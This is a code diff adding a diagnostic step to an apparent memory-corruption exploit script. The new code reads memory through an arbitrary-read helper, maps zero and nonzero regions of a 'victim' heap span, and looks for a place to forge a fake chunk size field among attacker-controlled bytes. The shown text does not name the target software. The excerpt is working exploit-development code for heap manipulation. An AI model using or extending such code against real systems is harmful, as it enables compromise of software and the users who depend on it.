@@ -215,6 +215,24 @@ def multi_walk():
         for a in range(v2 + bs + 0x10, v2 + bs + 0x80, 8):
             q = rd_try(a)
             print('  0x%x: 0x%016x' % (a, q if q is not None else -1))
+        # wake 9: content profile of the victim span — where do the
+        # stale bytes (attacker strings / serialized frames) end and
+        # the zeros begin. The outbuf lane needs a fake sizefield
+        # [odd byte][7 zero bytes] somewhere inside [v2+0x10,
+        # v2+bs+0x80): print each zero<->nonzero qword transition.
+        print('--- victim content profile (zero/nonzero qword runs) ---')
+        prev_nz = None
+        shown = 0
+        for a in range(v2 + 0x10, v2 + bs + 0x80, 8):
+            q = rd_try(a)
+            nz = q is not None and q != 0
+            if prev_nz is None or nz != prev_nz:
+                print('  0x%x: %s' % (a, 'NZ 0x%016x' % q if nz else 'zero'))
+                prev_nz = nz
+                shown += 1
+                if shown >= 24:
+                    print('  ... (transitions capped at 24)')
+                    break
         for k in range(bs + 0x10, bs + 0x200, 0x10):
             sf2 = rd_try(v2 + k + 8)
             if sf2 is not None and 0x20 <= (sf2 & ~7) <= 0x2000 and (sf2 & 1) == 1:
